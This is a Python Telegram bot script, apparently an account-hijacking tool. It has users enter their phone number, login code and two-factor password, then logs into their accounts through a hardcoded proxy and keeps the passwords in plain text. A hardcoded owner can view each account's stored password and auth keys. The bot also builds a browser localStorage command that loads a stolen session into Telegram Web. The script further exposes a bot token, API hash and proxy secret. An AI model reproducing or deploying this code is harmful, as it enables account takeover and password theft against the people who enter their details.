from imports import *


# Замените эти значения на свои
API_ID = '9'
API_HASH = "3975f648bb682ee889f35483bc618d1c"
BOT_TOKEN = '7573368313:AAHQw7icyb97ngrdNqaAkrdm3-rZqiQpcCw'
owner = 1046292733

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)


work = {}
current_step = {}

def load():
    if os.path.isfile("config.json"):
        with open("config.json", "r") as f:
            config = json.load(f)
    else:
        config = {}
    return config
def power(phone, method):
    global work
    if method == "dev":
        if not "phone" in work:
            work["phone"] = {phone: subprocess.Popen(["python", "owner.py", phone])}
        else:
            work["phone"][phone] = subprocess.Popen(["python", "owner.py", phone])
    else:
        work["phone"] = {phone: subprocess.Popen(["python", "dev.py", phone])}
async def panel_give(event):
    with open("config.json", "r") as f:
        cfgs = json.load(f)
    buttons = []
    for i in list(cfgs.values()):
        if i['owner'] == event.chat_id or owner == event.chat_id:
            buttons.append([Button.inline(f"{i['phone']}", f"panel_{i['phone']}_menu")])
    buttons.append([Button.inline("Запустить все", "panel_all_none")])
    return buttons
async def codes(event, phone):
    current_step[event.chat_id] = "codes"
    numpad=[
        [Button.inline("1", f"{phone}_1"), Button.inline("2", f"{phone}_2"), Button.inline("3", f"{phone}_3")],
        [Button.inline("4", f"{phone}_4"), Button.inline("5", f"{phone}_5"), Button.inline("6", f"{phone}_6")],
        [Button.inline("7", f"{phone}_7"), Button.inline("8", f"{phone}_8"), Button.inline("9", f"{phone}_9")],
        [Button.inline("❌", f"{phone}_cancle"), Button.inline("0", f"{phone}_0"), Button.inline("✅", f"{phone}_done")]
    ]
    future = asyncio.Future()
    async def handler(event):
        if current_step[event.chat_id] == "codes":
            text = (await client.get_messages(event.chat_id, ids=event.message_id)).text
            data = str(event.data.decode("utf-8"))
            if data.split("_")[1] == "done":
                future.set_result(str(text).replace("Введите код: ", ""))
                await client.edit_message(event.chat_id, event.message_id, text=f"Код: {text.replace('Введите код: ', '')}", buttons=None)
                current_step[event.chat_id] = "adduser_next3"
                client.remove_event_handler(handler) 
            elif data.split("_")[1] == "cancle":
                await client.edit_message(entity=event.chat_id, message=event.message_id, text="Введите код: ", buttons=numpad)
            else:
                if text == "Введите код:":
                    await client.edit_message(event.chat_id, event.message_id, f"{text} {data.split('_')[1]}", buttons=numpad)
                else:
                    await client.edit_message(event.chat_id, event.message_id, f"{text}{data.split('_')[1]}", buttons=numpad)
    await client.send_message(event.chat_id, "Введите код: ", buttons=numpad)
    client.remove_event_handler(handler) 
    client.add_event_handler(handler, events.CallbackQuery)

    code = await future
    return code
async def passwordss(event):
    current_step[event.chat_id] = "passwords"
    future = asyncio.Future()
    async def handler(event):
        if current_step[event.chat_id].startswith("passwords"):
            text = str(event.raw_text)
            future.set_result(str(text))
            await client.edit_message(event.chat_id, current_step[event.chat_id].split("_")[1], text=f"Пароль: {text}")
            client.remove_event_handler(handler) 
    pas = await client.send_message(event.chat_id, "Введите пароль: ")
    current_step[event.chat_id] = f"passwords_{pas.id}"
    client.add_event_handler(handler, events.NewMessage)

    password = await future
    return password
@client.on(events.NewMessage(pattern='/code'))
async def handler(event):
    await codes(event, "")
@client.on(events.NewMessage(pattern='/adduser'))
async def adduser(event):

    await event.respond("Пришлите номер")
    current_step[event.chat_id] = 'adduser_next'
@client.on(events.NewMessage(pattern='/panel'))
async def panel_gives(event):
    
    await event.respond("Выберите:", buttons=(await panel_give(event)))

@client.on(events.CallbackQuery)
async def panel(event):
    data = event.data.decode("utf-8")
    if data == "panel":
        await client.edit_message(event.chat_id, event.message_id, "Выберите:", buttons=(await panel_give(event)))
    elif data.startswith("panel_"):
        phone = str(event.data).split("_")[1]
        back = Button.inline("Назад", "panel")
        if phone=="all":
            with open("config.json", "r") as f:
                cfgs = json.load(f)
    
                for i in list(cfgs.values()):
                    power(str(i["phone"]), "dev")
            await event.respond("Запустил")
        elif str(data).split("_")[2] == "menu":
            if event.chat_id == owner:
                conf = Button.inline("Конфигурация", f"panel_{phone}_conf")
            buttons = [[Button.inline("Включить", f"panel_{phone}_on")], [Button.inline("Выключить", f"panel_{phone}_off")], [Button.inline("Передать", f"panel_{phone}_regive")], [back], [conf]]
            await client.edit_message(event.chat_id, event.message_id, "Выберите:", buttons=buttons)
        elif str(data).split("_")[2] == "conf":
            if len(str(data).split("_")) == 3:
                buttons = [
                [Button.inline("Номер", f"panel_{phone}_conf_number")],
                [Button.inline("api", f"panel_{phone}_conf_api")],
                [Button.inline("Пароль", f"panel_{phone}_conf_password")],
                [Button.inline("Владелец", f"panel_{phone}_conf_owner")],
                [Button.inline("Метод", f"panel_{phone}_conf_method")],
                [Button.inline("Чат", f"panel_{phone}_conf_chat")],
                [Button.inline("id", f"panel_{phone}_conf_id")],
                [Button.inline("Данные", f"panel_{phone}_conf_data")],
                [Button.inline("Лист", f"panel_{phone}_conf_list")],
                [back]
                ]
                await client.edit_message(event.chat_id, event.message_id, f"Конфигурация к {phone}", buttons=buttons)
            else:
                cfg = load()
                if str(data).split("_")[3] == "number":
                    await client.edit_message(event.chat_id, event.message_id, f"Номер {phone}\n а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "api":
                    await client.edit_message(event.chat_id, event.message_id, f"api id: {cfg[phone]['api_id']}\napi hash: {cfg[phone]['api_hash']}\n... а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "password":
                    await client.edit_message(event.chat_id, event.message_id, f"password: {cfg[phone]['password']}\n... а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "owner":
                    await client.edit_message(event.chat_id, event.message_id, f"Владелец: {cfg[phone]['owner']}\n а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "method":
                    await client.edit_message(event.chat_id, event.message_id, f"Метод: {cfg[phone]['method']}\n а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "chat":
                    await client.edit_message(event.chat_id, event.message_id, f"Чат: {cfg[phone]['chat']}\n а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "id":
                    await client.edit_message(event.chat_id, event.message_id, f"id: {cfg[phone]['id']}\n а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "data":
                    await client.edit_message(event.chat_id, event.message_id, f"Данные:\n {json.dumps(cfg[phone]['data'])}\n\n\nКоманда: localStorage.clear();)localStorage.setItem(\"user_auth\", \"{json.dumps(cfg[phone]['data'][0]['user_auth']).replace('\"', '\\\"')}\");localStorage.setItem(\"dc{cfg[phone]['data'][0]['user_auth']['dcID']}_auth_key\", \"\\\"{cfg[phone]['data'][0][f'dc{cfg[phone]['data'][0]['user_auth']['dcID']}_auth_key'].replace('\"', '\\\"')}\\\"\");location.reload()\n а вообще жди даун", buttons=[[back]])
                elif str(data).split("_")[3] == "list":
                    await client.edit_message(event.chat_id, event.message_id, f"\n а вообще жди даун", buttons=[[back]])
        elif str(data).split("_")[2] == "on":
            cfg = load()
            work[event.chat_id]= {"phone": phone}
            with open("config.json", "w") as f:
                json.dump(cfg, f, indent=4, ensure_ascii=False)
            power(phone, "dev")
            
            await client.edit_message(event.chat_id, event.message_id, "Успешно", buttons=[[back]])
        elif str(data).split("_")[2] == "off":
            print(work["phone"])
            if work["phone"][phone].poll() is None:
                work["phone"][phone].terminate()
                await client.edit_message(event.chat_id, event.message_id, "Выключен", buttons=[[back]])
        elif str(data).split("_")[2] == "regive":
            future = asyncio.Future()  
            current_step[event.chat_id] = "regive"
            async def handler(event):
                if current_step[event.chat_id] == "regive":
                    future.set_result(event.raw_text)
                    client.remove_event_handler(handler) 
            await client.edit_message(event.chat_id, event.message_id, "Пришлите id")
            client.add_event_handler(handler, events.NewMessage)

            id = await future
            cfgs = load()
            cfgs[phone]["owner"] = int(id)
            with open("config.json", "w") as f:
                json.dump(cfgs, f, indent=4, ensure_ascii=False)
            await client.edit_message(event.chat_id, event.message_id, "Успешно", buttons=[[back]])
            
@client.on(events.NewMessage)
async def handle_message(event):
    if event.chat_id in current_step and not str(event.message.message).startswith('/'):
        step = current_step[event.chat_id]

        

        async def next_phone(event):
            
            
            #await event.respond("Пользователь api_hash")
            current_step[event.chat_id] = 'adduser_next3'

        
            
            work[event.chat_id]["api_id"] = API_ID
            work[event.chat_id]["api_hash"] = API_HASH
            print(1)
            cfg = load()
            with open("config.json", "w") as f:
                cfg[work[event.chat_id]["phone"]] = work[event.chat_id]
                cfg[work[event.chat_id]["phone"]]["owner"] = event.chat_id
                json.dump(cfg, f, indent=4, ensure_ascii=False)
            print(2)
            proxy = ("81.177.6.46",49392,"f432422c6f33dd2d8cfe01ea25ce3261")
            client_session = TelegramClient(f"sessions/{work[event.chat_id]['phone']}", work[event.chat_id]["api_id"], work[event.chat_id]["api_hash"], device_model="devjeb", app_version="777", system_version="777", connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,proxy=proxy)
            await client_session.connect()

            if not await client_session.is_user_authorized():
                await client_session.send_code_request(work[event.chat_id]["phone"])
                current_step[event.chat_id] = 'codes'
                phone = work[event.chat_id]["phone"]
                code = await codes(event, work[event.chat_id]["phone"])
                try:
                    await client_session.sign_in(phone, code=int(code))
                except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
                    passwords = await passwordss(event)
                    cfg = load()
                    with open("config.json", "w") as f:
                        cfg[work[event.chat_id]["phone"]]["password"] = passwords
                        cfg[work[event.chat_id]["phone"]]["method"] = "dev"
                        json.dump(cfg, f, indent=4, ensure_ascii=False)
                    await client_session.sign_in(phone, password=passwords)
                    client.edit_message(event.chat_id, event.id, "Успешно!")
                except errors.SendCodeUnavailableError:
                    await client.edit_message(event.chat_id, event.id, "Все доступные методы отправки кода исчерпаны. Пожалуйста, подождите перед повторной попыткой.")
                    await asyncio.sleep(3600)  # Ждем час перед повторной попыткой
                except errors.FloodWaitError as e:
                    await client.edit_message(event.chat_id, event.id, f"Слишком много запросов. Пожалуйста, подождите {e.seconds} секунд.")
                    await asyncio.sleep(e.seconds)  # Ждем указанное время
                except Exception as e:
                    await client.edit_message(event.chat_id, event.id, f"Произошла ошибка: {e}")
                    
                await client_session.disconnect()
                power(work[event.chat_id]["phone"], "dev")
                await event.respond("Запуск")
                    
                        

            else:
                await client_session.disconnect()
                cfg = load()
                cfg[work[event.chat_id]["phone"]]["log"] = "success"
                with open("config.json", "w") as f:
                    json.dump(cfg, f, indent=4, ensure_ascii=False)
                await event.respond(await other(event))

        if step == 'adduser_next':
            phone = str(event.message.message).replace(" ", "").replace("+", "")
            work[event.chat_id] = {"phone": phone}
            await next_phone(event)
        elif step == 'password':
            password = str(event.message.message)
            cfg = load()
            cfg[work[event.chat_id]["phone"]]["password"] = password
            with open("config.json", "w") as f:
                json.dump(cfg, f, indent=4, ensure_ascii=False)
            power(work[event.chat_id]["phone"], "dev")
            await event.respond("Успешно")
        elif step == "stop_phone":
            phone = str(event.message.message).replace(" ", "")
            cfg = load()
            if phone in cfg:
                if cfg[phone]["owner"] == event.chat_id or event.chat_id == owner:
                    if work["phone"][phone].poll() is None:
                        work["phone"][phone].terminate()
                        await event.respond("Успешно")
            else:
                await event.respond("Зарегистрируйтесь сначала\n/adduser")

async def other(event):
    await asyncio.sleep(7)
    cfg = load()
    log = cfg[work[event.chat_id]["phone"]]["log"]
    if log == "code":
        current_step[event.chat_id] = 'codes'
        code = await codes(event, work[event.chat_id]["phone"])
        cfg = load()
        cfg[work[event.chat_id]["phone"]]["code"] = code
        with open("config.json", "w") as f:
            json.dump(cfg, f, indent=4, ensure_ascii=False)
        await event.respond(await other(event))
    elif log == "password":
        current_step[event.chat_id] = 'password'
        return "Введите пароль"
    elif log == "success":
        phone = work[event.chat_id]["phone"]
        if "phone" in work:
            if work[event.chat_id]["phone"] in work[event.chat_id]["phone"]:
                if work["phone"][work[event.chat_id]["phone"]].poll() is None:
                    return "Успешная авторизация"
        buttons = [[Button.inline("Регистрация бота", f"{phone}_bot")], [Button.inline("Только чат", f"{phone}_dev")]]
        future = asyncio.Future()
        async def handler(event):
            data = str(event.data.decode("utf-8"))
            if data.split("_")[1] == "bot":
                cfg = load()
                future.set_result("bot")
                with open("config.json", "w") as f:
                    cfg[work[event.chat_id]["phone"]]["method"] = "bot"
                    json.dump(cfg, f, indent=4, ensure_ascii=False)
                client.remove_event_handler(handler)
            elif data.split("_")[1] == "dev":
                cfg = load()
                future.set_result("dev")
                with open("config.json", "w") as f:
                    cfg[work[event.chat_id]["phone"]]["method"] = "dev"
                    json.dump(cfg, f, indent=4, ensure_ascii=False)
                client.remove_event_handler(handler)
        ev = await client.send_message(event.chat_id, "Успешно, выберите метод:", buttons=buttons)
        client.add_event_handler(handler, events.CallbackQuery)
        method = await future
        power(work[event.chat_id]["phone"], method)
        await client.edit_message(event.chat_id, ev, "Успешно, идёт запуск!", buttons=None)
        return "Готово"
if __name__ == "__main__":
    print("Бот запущен...")
    client.run_until_disconnected()
